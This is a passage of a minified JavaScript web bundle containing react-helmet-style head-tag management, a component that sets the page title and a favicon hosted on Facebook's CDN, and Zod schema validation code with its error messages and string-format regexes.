        return Object.keys(r).forEach(function(a) {
            var l = Rl[a] || a;
            if (l === Re.INNER_HTML || l === Re.CSS_TEXT) {
                var u = r.innerHTML || r.cssText;
                i.dangerouslySetInnerHTML = {
                    __html: u
                }
            } else
                i[l] = r[a]
        }),
        ie.createElement(t, i)
    })
}
  , In = function(t, n, r) {
    switch (t) {
    case oe.TITLE:
        return {
            toComponent: function() {
                return Nk(t, n.title, n.titleAttributes)
            },
            toString: function() {
                return kk(t, n.title, n.titleAttributes, r)
            }
        };
    case eo.BODY:
    case eo.HTML:
        return {
            toComponent: function() {
                return Lw(n)
            },
            toString: function() {
                return Iw(n)
            }
        };
    default:
        return {
            toComponent: function() {
                return Rk(t, n)
            },
            toString: function() {
                return Tk(t, n, r)
            }
        }
    }
}
  , Dw = function(t) {
    var n = t.baseTag
      , r = t.bodyAttributes
      , o = t.encode
      , s = t.htmlAttributes
      , i = t.linkTags
      , a = t.metaTags
      , l = t.noscriptTags
      , u = t.scriptTags
      , c = t.styleTags
      , d = t.title
      , p = d === void 0 ? "" : d
      , w = t.titleAttributes;
    return {
        base: In(oe.BASE, n, o),
        bodyAttributes: In(eo.BODY, r, o),
        htmlAttributes: In(eo.HTML, s, o),
        link: In(oe.LINK, i, o),
        meta: In(oe.META, a, o),
        noscript: In(oe.NOSCRIPT, l, o),
        script: In(oe.SCRIPT, u, o),
        style: In(oe.STYLE, c, o),
        title: In(oe.TITLE, {
            title: p,
            titleAttributes: w
        }, o)
    }
}
  , Ak = function(t) {
    var n, r;
    return r = n = function(o) {
        mk(s, o);
        function s() {
            return pk(this, s),
            vk(this, o.apply(this, arguments))
        }
        return s.prototype.shouldComponentUpdate = function(a) {
            return !rk(this.props, a)
        }
        ,
        s.prototype.mapNestedChildrenToProps = function(a, l) {
            if (!l)
                return null;
            switch (a.type) {
            case oe.SCRIPT:
            case oe.NOSCRIPT:
                return {
                    innerHTML: l
                };
            case oe.STYLE:
                return {
                    cssText: l
                }
            }
            throw new Error("<" + a.type + " /> elements are self-closing and can not contain children. Refer to our API for more information.")
        }
        ,
        s.prototype.flattenArrayTypeChildren = function(a) {
            var l, u = a.child, c = a.arrayTypeChildren, d = a.newChildProps, p = a.nestedChildren;
            return _t({}, c, (l = {},
            l[u.type] = [].concat(c[u.type] || [], [_t({}, d, this.mapNestedChildrenToProps(u, p))]),
            l))
        }
        ,
        s.prototype.mapObjectTypeChildren = function(a) {
            var l, u, c = a.child, d = a.newProps, p = a.newChildProps, w = a.nestedChildren;
            switch (c.type) {
            case oe.TITLE:
                return _t({}, d, (l = {},
                l[c.type] = w,
                l.titleAttributes = _t({}, p),
                l));
            case oe.BODY:
                return _t({}, d, {
                    bodyAttributes: _t({}, p)
                });
            case oe.HTML:
                return _t({}, d, {
                    htmlAttributes: _t({}, p)
                })
            }
            return _t({}, d, (u = {},
            u[c.type] = _t({}, p),
            u))
        }
        ,
        s.prototype.mapArrayTypeChildrenToProps = function(a, l) {
            var u = _t({}, l);
            return Object.keys(a).forEach(function(c) {
                var d;
                u = _t({}, u, (d = {},
                d[c] = a[c],
                d))
            }),
            u
        }
        ,
        s.prototype.warnOnInvalidChildren = function(a, l) {
            return !0
        }
        ,
        s.prototype.mapChildrenToProps = function(a, l) {
            var u = this
              , c = {};
            return ie.Children.forEach(a, function(d) {
                if (!(!d || !d.props)) {
                    var p = d.props
                      , w = p.children
                      , x = am(p, ["children"])
                      , m = Pk(x);
                    switch (u.warnOnInvalidChildren(d, w),
                    d.type) {
                    case oe.LINK:
                    case oe.META:
                    case oe.NOSCRIPT:
                    case oe.SCRIPT:
                    case oe.STYLE:
                        c = u.flattenArrayTypeChildren({
                            child: d,
                            arrayTypeChildren: c,
                            newChildProps: m,
                            nestedChildren: w
                        });
                        break;
                    default:
                        l = u.mapObjectTypeChildren({
                            child: d,
                            newProps: l,
                            newChildProps: m,
                            nestedChildren: w
                        });
                        break
                    }
                }
            }),
            l = this.mapArrayTypeChildrenToProps(c, l),
            l
        }
        ,
        s.prototype.render = function() {
            var a = this.props
              , l = a.children
              , u = am(a, ["children"])
              , c = _t({}, u);
            return l && (c = this.mapChildrenToProps(l, c)),
            ie.createElement(t, c)
        }
        ,
        hk(s, null, [{
            key: "canUseDOM",
            set: function(a) {
                t.canUseDOM = a
            }
        }]),
        s
    }(ie.Component),
    n.propTypes = {
        base: Ne.object,
        bodyAttributes: Ne.object,
        children: Ne.oneOfType([Ne.arrayOf(Ne.node), Ne.node]),
        defaultTitle: Ne.string,
        defer: Ne.bool,
        encodeSpecialCharacters: Ne.bool,
        htmlAttributes: Ne.object,
        link: Ne.arrayOf(Ne.object),
        meta: Ne.arrayOf(Ne.object),
        noscript: Ne.arrayOf(Ne.object),
        onChangeClientState: Ne.func,
        script: Ne.arrayOf(Ne.object),
        style: Ne.arrayOf(Ne.object),
        title: Ne.string,
        titleAttributes: Ne.object,
        titleTemplate: Ne.string
    },
    n.defaultProps = {
        defer: !0,
        encodeSpecialCharacters: !0
    },
    n.peek = t.peek,
    n.rewind = function() {
        var o = t.rewind();
        return o || (o = Dw({
            baseTag: [],
            bodyAttributes: {},
            encodeSpecialCharacters: !0,
            htmlAttributes: {},
            linkTags: [],
            metaTags: [],
            noscriptTags: [],
            scriptTags: [],
            styleTags: [],
            title: "",
            titleAttributes: {}
        })),
        o
    }
    ,
    r
}
  , Ok = function() {
    return null
}
  , jk = YC(xk, bk, Dw)(Ok)
  , Ed = Ak(jk);
Ed.renderStatic = Ed.rewind;
function qf({title: e, description: t}) {
    return g.jsxs(Ed, {
        children: [g.jsx("title", {
            children: e
        }), g.jsx("meta", {
            name: "description",
            content: t
        }), g.jsx("link", {
            rel: "icon",
            href: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"
        })]
    })
}
var pe;
(function(e) {
    e.assertEqual = o => o;
    function t(o) {}
    e.assertIs = t;
    function n(o) {
        throw new Error
    }
    e.assertNever = n,
    e.arrayToEnum = o => {
        const s = {};
        for (const i of o)
            s[i] = i;
        return s
    }
    ,
    e.getValidEnumValues = o => {
        const s = e.objectKeys(o).filter(a => typeof o[o[a]] != "number")
          , i = {};
        for (const a of s)
            i[a] = o[a];
        return e.objectValues(i)
    }
    ,
    e.objectValues = o => e.objectKeys(o).map(function(s) {
        return o[s]
    }),
    e.objectKeys = typeof Object.keys == "function" ? o => Object.keys(o) : o => {
        const s = [];
        for (const i in o)
            Object.prototype.hasOwnProperty.call(o, i) && s.push(i);
        return s
    }
    ,
    e.find = (o, s) => {
        for (const i of o)
            if (s(i))
                return i
    }
    ,
    e.isInteger = typeof Number.isInteger == "function" ? o => Number.isInteger(o) : o => typeof o == "number" && isFinite(o) && Math.floor(o) === o;
    function r(o, s=" | ") {
        return o.map(i => typeof i == "string" ? `'${i}'` : i).join(s)
    }
    e.joinValues = r,
    e.jsonStringifyReplacer = (o, s) => typeof s == "bigint" ? s.toString() : s
}
)(pe || (pe = {}));
var bd;
(function(e) {
    e.mergeShapes = (t, n) => ({
        ...t,
        ...n
    })
}
)(bd || (bd = {}));
const W = pe.arrayToEnum(["string", "nan", "number", "integer", "float", "boolean", "date", "bigint", "symbol", "function", "undefined", "null", "array", "object", "unknown", "promise", "void", "never", "map", "set"])
  , ur = e => {
    switch (typeof e) {
    case "undefined":
        return W.undefined;
    case "string":
        return W.string;
    case "number":
        return isNaN(e) ? W.nan : W.number;
    case "boolean":
        return W.boolean;
    case "function":
        return W.function;
    case "bigint":
        return W.bigint;
    case "symbol":
        return W.symbol;
    case "object":
        return Array.isArray(e) ? W.array : e === null ? W.null : e.then && typeof e.then == "function" && e.catch && typeof e.catch == "function" ? W.promise : typeof Map < "u" && e instanceof Map ? W.map : typeof Set < "u" && e instanceof Set ? W.set : typeof Date < "u" && e instanceof Date ? W.date : W.object;
    default:
        return W.unknown
    }
}
  , I = pe.arrayToEnum(["invalid_type", "invalid_literal", "custom", "invalid_union", "invalid_union_discriminator", "invalid_enum_value", "unrecognized_keys", "invalid_arguments", "invalid_return_type", "invalid_date", "invalid_string", "too_small", "too_big", "invalid_intersection_types", "not_multiple_of", "not_finite"])
  , Mk = e => JSON.stringify(e, null, 2).replace(/"([^"]+)":/g, "$1:");
class It extends Error {
    constructor(t) {
        super(),
        this.issues = [],
        this.addIssue = r => {
            this.issues = [...this.issues, r]
        }
        ,
        this.addIssues = (r=[]) => {
            this.issues = [...this.issues, ...r]
        }
        ;
        const n = new.target.prototype;
        Object.setPrototypeOf ? Object.setPrototypeOf(this, n) : this.__proto__ = n,
        this.name = "ZodError",
        this.issues = t
    }
    get errors() {
        return this.issues
    }
    format(t) {
        const n = t || function(s) {
            return s.message
        }
          , r = {
            _errors: []
        }
          , o = s => {
            for (const i of s.issues)
                if (i.code === "invalid_union")
                    i.unionErrors.map(o);
                else if (i.code === "invalid_return_type")
                    o(i.returnTypeError);
                else if (i.code === "invalid_arguments")
                    o(i.argumentsError);
                else if (i.path.length === 0)
                    r._errors.push(n(i));
                else {
                    let a = r
                      , l = 0;
                    for (; l < i.path.length; ) {
                        const u = i.path[l];
                        l === i.path.length - 1 ? (a[u] = a[u] || {
                            _errors: []
                        },
                        a[u]._errors.push(n(i))) : a[u] = a[u] || {
                            _errors: []
                        },
                        a = a[u],
                        l++
                    }
                }
        }
        ;
        return o(this),
        r
    }
    static assert(t) {
        if (!(t instanceof It))
            throw new Error(`Not a ZodError: ${t}`)
    }
    toString() {
        return this.message
    }
    get message() {
        return JSON.stringify(this.issues, pe.jsonStringifyReplacer, 2)
    }
    get isEmpty() {
        return this.issues.length === 0
    }
    flatten(t=n => n.message) {
        const n = {}
          , r = [];
        for (const o of this.issues)
            o.path.length > 0 ? (n[o.path[0]] = n[o.path[0]] || [],
            n[o.path[0]].push(t(o))) : r.push(t(o));
        return {
            formErrors: r,
            fieldErrors: n
        }
    }
    get formErrors() {
        return this.flatten()
    }
}
It.create = e => new It(e);
const hs = (e, t) => {
    let n;
    switch (e.code) {
    case I.invalid_type:
        e.received === W.undefined ? n = "Required" : n = `Expected ${e.expected}, received ${e.received}`;
        break;
    case I.invalid_literal:
        n = `Invalid literal value, expected ${JSON.stringify(e.expected, pe.jsonStringifyReplacer)}`;
        break;
    case I.unrecognized_keys:
        n = `Unrecognized key(s) in object: ${pe.joinValues(e.keys, ", ")}`;
        break;
    case I.invalid_union:
        n = "Invalid input";
        break;
    case I.invalid_union_discriminator:
        n = `Invalid discriminator value. Expected ${pe.joinValues(e.options)}`;
        break;
    case I.invalid_enum_value:
        n = `Invalid enum value. Expected ${pe.joinValues(e.options)}, received '${e.received}'`;
        break;
    case I.invalid_arguments:
        n = "Invalid function arguments";
        break;
    case I.invalid_return_type:
        n = "Invalid function return type";
        break;
    case I.invalid_date:
        n = "Invalid date";
        break;
    case I.invalid_string:
        typeof e.validation == "object" ? "includes"in e.validation ? (n = `Invalid input: must include "${e.validation.includes}"`,
        typeof e.validation.position == "number" && (n = `${n} at one or more positions greater than or equal to ${e.validation.position}`)) : "startsWith"in e.validation ? n = `Invalid input: must start with "${e.validation.startsWith}"` : "endsWith"in e.validation ? n = `Invalid input: must end with "${e.validation.endsWith}"` : pe.assertNever(e.validation) : e.validation !== "regex" ? n = `Invalid ${e.validation}` : n = "Invalid";
        break;
    case I.too_small:
        e.type === "array" ? n = `Array must contain ${e.exact ? "exactly" : e.inclusive ? "at least" : "more than"} ${e.minimum} element(s)` : e.type === "string" ? n = `String must contain ${e.exact ? "exactly" : e.inclusive ? "at least" : "over"} ${e.minimum} character(s)` : e.type === "number" ? n = `Number must be ${e.exact ? "exactly equal to " : e.inclusive ? "greater than or equal to " : "greater than "}${e.minimum}` : e.type === "date" ? n = `Date must be ${e.exact ? "exactly equal to " : e.inclusive ? "greater than or equal to " : "greater than "}${new Date(Number(e.minimum))}` : n = "Invalid input";
        break;
    case I.too_big:
        e.type === "array" ? n = `Array must contain ${e.exact ? "exactly" : e.inclusive ? "at most" : "less than"} ${e.maximum} element(s)` : e.type === "string" ? n = `String must contain ${e.exact ? "exactly" : e.inclusive ? "at most" : "under"} ${e.maximum} character(s)` : e.type === "number" ? n = `Number must be ${e.exact ? "exactly" : e.inclusive ? "less than or equal to" : "less than"} ${e.maximum}` : e.type === "bigint" ? n = `BigInt must be ${e.exact ? "exactly" : e.inclusive ? "less than or equal to" : "less than"} ${e.maximum}` : e.type === "date" ? n = `Date must be ${e.exact ? "exactly" : e.inclusive ? "smaller than or equal to" : "smaller than"} ${new Date(Number(e.maximum))}` : n = "Invalid input";
        break;
    case I.custom:
        n = "Invalid input";
        break;
    case I.invalid_intersection_types:
        n = "Intersection results could not be merged";
        break;
    case I.not_multiple_of:
        n = `Number must be a multiple of ${e.multipleOf}`;
        break;
    case I.not_finite:
        n = "Number must be finite";
        break;
    default:
        n = t.defaultError,
        pe.assertNever(e)
    }
    return {
        message: n
    }
}
;
let Fw = hs;
function Ik(e) {
    Fw = e
}
function Al() {
    return Fw
}
const Ol = e => {
    const {data: t, path: n, errorMaps: r, issueData: o} = e
      , s = [...n, ...o.path || []]
      , i = {
        ...o,
        path: s
    };
    if (o.message !== void 0)
        return {
            ...o,
            path: s,
            message: o.message
        };
    let a = "";
    const l = r.filter(u => !!u).slice().reverse();
    for (const u of l)
        a = u(i, {
            data: t,
            defaultError: a
        }).message;
    return {
        ...o,
        path: s,
        message: a
    }
}
  , Lk = [];
function B(e, t) {
    const n = Al()
      , r = Ol({
        issueData: t,
        data: e.data,
        path: e.path,
        errorMaps: [e.common.contextualErrorMap, e.schemaErrorMap, n, n === hs ? void 0 : hs].filter(o => !!o)
    });
    e.common.issues.push(r)
}
class pt {
    constructor() {
        this.value = "valid"
    }
    dirty() {
        this.value === "valid" && (this.value = "dirty")
    }
    abort() {
        this.value !== "aborted" && (this.value = "aborted")
    }
    static mergeArray(t, n) {
        const r = [];
        for (const o of n) {
            if (o.status === "aborted")
                return ne;
            o.status === "dirty" && t.dirty(),
            r.push(o.value)
        }
        return {
            status: t.value,
            value: r
        }
    }
    static async mergeObjectAsync(t, n) {
        const r = [];
        for (const o of n) {
            const s = await o.key
              , i = await o.value;
            r.push({
                key: s,
                value: i
            })
        }
        return pt.mergeObjectSync(t, r)
    }
    static mergeObjectSync(t, n) {
        const r = {};
        for (const o of n) {
            const {key: s, value: i} = o;
            if (s.status === "aborted" || i.status === "aborted")
                return ne;
            s.status === "dirty" && t.dirty(),
            i.status === "dirty" && t.dirty(),
            s.value !== "__proto__" && (typeof i.value < "u" || o.alwaysSet) && (r[s.value] = i.value)
        }
        return {
            status: t.value,
            value: r
        }
    }
}
const ne = Object.freeze({
    status: "aborted"
})
  , Fo = e => ({
    status: "dirty",
    value: e
})
  , wt = e => ({
    status: "valid",
    value: e
})
  , Cd = e => e.status === "aborted"
  , kd = e => e.status === "dirty"
  , Oi = e => e.status === "valid"
  , ji = e => typeof Promise < "u" && e instanceof Promise;
function jl(e, t, n, r) {
    if (typeof t == "function" ? e !== t || !r : !t.has(e))
        throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return t.get(e)
}
function Vw(e, t, n, r, o) {
    if (typeof t == "function" ? e !== t || !o : !t.has(e))
        throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return t.set(e, n),
    n
}
var G;
(function(e) {
    e.errToObj = t => typeof t == "string" ? {
        message: t
    } : t || {},
    e.toString = t => typeof t == "string" ? t : t == null ? void 0 : t.message
}
)(G || (G = {}));
var Zs, Ks;
class Nn {
    constructor(t, n, r, o) {
        this._cachedPath = [],
        this.parent = t,
        this.data = n,
        this._path = r,
        this._key = o
    }
    get path() {
        return this._cachedPath.length || (this._key instanceof Array ? this._cachedPath.push(...this._path, ...this._key) : this._cachedPath.push(...this._path, this._key)),
        this._cachedPath
    }
}
const cm = (e, t) => {
    if (Oi(t))
        return {
            success: !0,
            data: t.value
        };
    if (!e.common.issues.length)
        throw new Error("Validation failed but no issues detected.");
    return {
        success: !1,
        get error() {
            if (this._error)
                return this._error;
            const n = new It(e.common.issues);
            return this._error = n,
            this._error
        }
    }
}
;
function ae(e) {
    if (!e)
        return {};
    const {errorMap: t, invalid_type_error: n, required_error: r, description: o} = e;
    if (t && (n || r))
        throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);
    return t ? {
        errorMap: t,
        description: o
    } : {
        errorMap: (i, a) => {
            var l, u;
            const {message: c} = e;
            return i.code === "invalid_enum_value" ? {
                message: c ?? a.defaultError
            } : typeof a.data > "u" ? {
                message: (l = c ?? r) !== null && l !== void 0 ? l : a.defaultError
            } : i.code !== "invalid_type" ? {
                message: a.defaultError
            } : {
                message: (u = c ?? n) !== null && u !== void 0 ? u : a.defaultError
            }
        }
        ,
        description: o
    }
}
class ue {
    constructor(t) {
        this.spa = this.safeParseAsync,
        this._def = t,
        this.parse = this.parse.bind(this),
        this.safeParse = this.safeParse.bind(this),
        this.parseAsync = this.parseAsync.bind(this),
        this.safeParseAsync = this.safeParseAsync.bind(this),
        this.spa = this.spa.bind(this),
        this.refine = this.refine.bind(this),
        this.refinement = this.refinement.bind(this),
        this.superRefine = this.superRefine.bind(this),
        this.optional = this.optional.bind(this),
        this.nullable = this.nullable.bind(this),
        this.nullish = this.nullish.bind(this),
        this.array = this.array.bind(this),
        this.promise = this.promise.bind(this),
        this.or = this.or.bind(this),
        this.and = this.and.bind(this),
        this.transform = this.transform.bind(this),
        this.brand = this.brand.bind(this),
        this.default = this.default.bind(this),
        this.catch = this.catch.bind(this),
        this.describe = this.describe.bind(this),
        this.pipe = this.pipe.bind(this),
        this.readonly = this.readonly.bind(this),
        this.isNullable = this.isNullable.bind(this),
        this.isOptional = this.isOptional.bind(this)
    }
    get description() {
        return this._def.description
    }
    _getType(t) {
        return ur(t.data)
    }
    _getOrReturnCtx(t, n) {
        return n || {
            common: t.parent.common,
            data: t.data,
            parsedType: ur(t.data),
            schemaErrorMap: this._def.errorMap,
            path: t.path,
            parent: t.parent
        }
    }
    _processInputParams(t) {
        return {
            status: new pt,
            ctx: {
                common: t.parent.common,
                data: t.data,
                parsedType: ur(t.data),
                schemaErrorMap: this._def.errorMap,
                path: t.path,
                parent: t.parent
            }
        }
    }
    _parseSync(t) {
        const n = this._parse(t);
        if (ji(n))
            throw new Error("Synchronous parse encountered promise.");
        return n
    }
    _parseAsync(t) {
        const n = this._parse(t);
        return Promise.resolve(n)
    }
    parse(t, n) {
        const r = this.safeParse(t, n);
        if (r.success)
            return r.data;
        throw r.error
    }
    safeParse(t, n) {
        var r;
        const o = {
            common: {
                issues: [],
                async: (r = n == null ? void 0 : n.async) !== null && r !== void 0 ? r : !1,
                contextualErrorMap: n == null ? void 0 : n.errorMap
            },
            path: (n == null ? void 0 : n.path) || [],
            schemaErrorMap: this._def.errorMap,
            parent: null,
            data: t,
            parsedType: ur(t)
        }
          , s = this._parseSync({
            data: t,
            path: o.path,
            parent: o
        });
        return cm(o, s)
    }
    async parseAsync(t, n) {
        const r = await this.safeParseAsync(t, n);
        if (r.success)
            return r.data;
        throw r.error
    }
    async safeParseAsync(t, n) {
        const r = {
            common: {
                issues: [],
                contextualErrorMap: n == null ? void 0 : n.errorMap,
                async: !0
            },
            path: (n == null ? void 0 : n.path) || [],
            schemaErrorMap: this._def.errorMap,
            parent: null,
            data: t,
            parsedType: ur(t)
        }
          , o = this._parse({
            data: t,
            path: r.path,
            parent: r
        })
          , s = await (ji(o) ? o : Promise.resolve(o));
        return cm(r, s)
    }
    refine(t, n) {
        const r = o => typeof n == "string" || typeof n > "u" ? {
            message: n
        } : typeof n == "function" ? n(o) : n;
        return this._refinement( (o, s) => {
            const i = t(o)
              , a = () => s.addIssue({
                code: I.custom,
                ...r(o)
            });
            return typeof Promise < "u" && i instanceof Promise ? i.then(l => l ? !0 : (a(),
            !1)) : i ? !0 : (a(),
            !1)
        }
        )
    }
    refinement(t, n) {
        return this._refinement( (r, o) => t(r) ? !0 : (o.addIssue(typeof n == "function" ? n(r, o) : n),
        !1))
    }
    _refinement(t) {
        return new pn({
            schema: this,
            typeName: te.ZodEffects,
            effect: {
                type: "refinement",
                refinement: t
            }
        })
    }
    superRefine(t) {
        return this._refinement(t)
    }
    optional() {
        return Tn.create(this, this._def)
    }
    nullable() {
        return Ar.create(this, this._def)
    }
    nullish() {
        return this.nullable().optional()
    }
    array() {
        return dn.create(this, this._def)
    }
    promise() {
        return vs.create(this, this._def)
    }
    or(t) {
        return Di.create([this, t], this._def)
    }
    and(t) {
        return Fi.create(this, t, this._def)
    }
    transform(t) {
        return new pn({
            ...ae(this._def),
            schema: this,
            typeName: te.ZodEffects,
            effect: {
                type: "transform",
                transform: t
            }
        })
    }
    default(t) {
        const n = typeof t == "function" ? t : () => t;
        return new Bi({
            ...ae(this._def),
            innerType: this,
            defaultValue: n,
            typeName: te.ZodDefault
        })
    }
    brand() {
        return new Gf({
            typeName: te.ZodBranded,
            type: this,
            ...ae(this._def)
        })
    }
    catch(t) {
        const n = typeof t == "function" ? t : () => t;
        return new Hi({
            ...ae(this._def),
            innerType: this,
            catchValue: n,
            typeName: te.ZodCatch
        })
    }
    describe(t) {
        const n = this.constructor;
        return new n({
            ...this._def,
            description: t
        })
    }
    pipe(t) {
        return oa.create(this, t)
    }
    readonly() {
        return Wi.create(this)
    }
    isOptional() {
        return this.safeParse(void 0).success
    }
    isNullable() {
        return this.safeParse(null).success
    }
}
const Dk = /^c[^\s-]{8,}$/i
  , Fk = /^[0-9a-z]+$/
  , Vk = /^[0-9A-HJKMNP-TV-Z]{26}$/
  , zk = /^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i
  , $k = /^[a-z0-9_-]{21}$/i
  , Uk = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/
  , Bk = /^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i
  , Hk = "^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";
let cc;
const Wk = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/
  , Zk = /^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/
  , Kk = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/
  , zw = "((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))"
  , Qk = new RegExp(`^${zw}$`);
function $w(e) {
    let t = "([01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d";
    return e.precision ? t = `${t}\\.\\d{${e.precision}}` : e.precision == null && (t = `${t}(\\.\\d+)?`),
    t
}
function qk(e) {
    return new RegExp(`^${$w(e)}$`)
}
function Uw(e) {
    let t = `${zw}T${$w(e)}`;
    const n = [];
    return n.push(e.local ? "Z?" : "Z"),
    e.offset && n.push("([+-]\\d{2}:?\\d{2})"),
    t = `${t}(${n.join("|")})`,
    new RegExp(`^${t}$`)
}
function Gk(e, t) {
    return !!((t === "v4" || !t) && Wk.test(e) || (t === "v6" || !t) && Zk.test(e))
}
class ln extends ue {
    _parse(t) {
        if (this._def.coerce && (t.data = String(t.data)),
        this._getType(t) !== W.string) {
            const s = this._getOrReturnCtx(t);
            return B(s, {
                code: I.invalid_type,
                expected: W.string,
                received: s.parsedType
            }),
            ne
        }
        const r = new pt;
        let o;
        for (const s of this._def.checks)
            if (s.kind === "min")
                t.data.length < s.value && (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.too_small,
                    minimum: s.value,
                    type: "string",
                    inclusive: !0,
                    exact: !1,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "max")
                t.data.length > s.value && (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.too_big,
                    maximum: s.value,
                    type: "string",
                    inclusive: !0,
                    exact: !1,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "length") {
                const i = t.data.length > s.value
                  , a = t.data.length < s.value;
                (i || a) && (o = this._getOrReturnCtx(t, o),
                i ? B(o, {
                    code: I.too_big,
                    maximum: s.value,
                    type: "string",
                    inclusive: !0,
                    exact: !0,
                    message: s.message
                }) : a && B(o, {
                    code: I.too_small,
                    minimum: s.value,
                    type: "string",
                    inclusive: !0,
                    exact: !0,
                    message: s.message
                }),
                r.dirty())
            } else if (s.kind === "email")
                Bk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "email",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "emoji")
                cc || (cc = new RegExp(Hk,"u")),
                cc.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "emoji",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "uuid")
                zk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "uuid",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "nanoid")
                $k.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "nanoid",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "cuid")
                Dk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "cuid",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "cuid2")
                Fk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "cuid2",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "ulid")
                Vk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "ulid",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty());
            else if (s.kind === "url")
                try {
                    new URL(t.data)
                } catch {
                    o = this._getOrReturnCtx(t, o),
                    B(o, {
                        validation: "url",
                        code: I.invalid_string,
                        message: s.message
                    }),
                    r.dirty()
                }
            else
                s.kind === "regex" ? (s.regex.lastIndex = 0,
                s.regex.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "regex",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty())) : s.kind === "trim" ? t.data = t.data.trim() : s.kind === "includes" ? t.data.includes(s.value, s.position) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: {
                        includes: s.value,
                        position: s.position
                    },
                    message: s.message
                }),
                r.dirty()) : s.kind === "toLowerCase" ? t.data = t.data.toLowerCase() : s.kind === "toUpperCase" ? t.data = t.data.toUpperCase() : s.kind === "startsWith" ? t.data.startsWith(s.value) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: {
                        startsWith: s.value
                    },
                    message: s.message
                }),
                r.dirty()) : s.kind === "endsWith" ? t.data.endsWith(s.value) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: {
                        endsWith: s.value
                    },
                    message: s.message
                }),
                r.dirty()) : s.kind === "datetime" ? Uw(s).test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: "datetime",
                    message: s.message
                }),
                r.dirty()) : s.kind === "date" ? Qk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: "date",
                    message: s.message
                }),
                r.dirty()) : s.kind === "time" ? qk(s).test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    code: I.invalid_string,
                    validation: "time",
                    message: s.message
                }),
                r.dirty()) : s.kind === "duration" ? Uk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "duration",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty()) : s.kind === "ip" ? Gk(t.data, s.version) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "ip",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty()) : s.kind === "base64" ? Kk.test(t.data) || (o = this._getOrReturnCtx(t, o),
                B(o, {
                    validation: "base64",
                    code: I.invalid_string,
                    message: s.message
                }),
                r.dirty()) : pe.assertNever(s);
        return {
